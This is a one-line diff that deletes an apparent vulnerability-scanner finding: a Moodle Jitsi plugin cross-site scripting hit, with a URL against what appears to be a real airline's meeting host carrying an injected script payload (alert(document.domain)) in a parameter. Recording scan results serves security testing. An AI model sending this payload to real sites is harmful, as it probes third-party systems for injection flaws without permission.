@@ -1,1 +1,0 @@
-[2021-04-08 06:54:51] [moodle-jitsi-plugin-xss] [http] [medium] https://meet.brusselsairlines.com/mod/jitsi/sessionpriv.php?avatar=https%3A%2F%2Ftargetdomain.com%2Fuser%2Fpix.php%2F498%2Ff1.jpg&nom=test_user%27)%3balert(document.domain)%3b//&ses=test_user&t=1
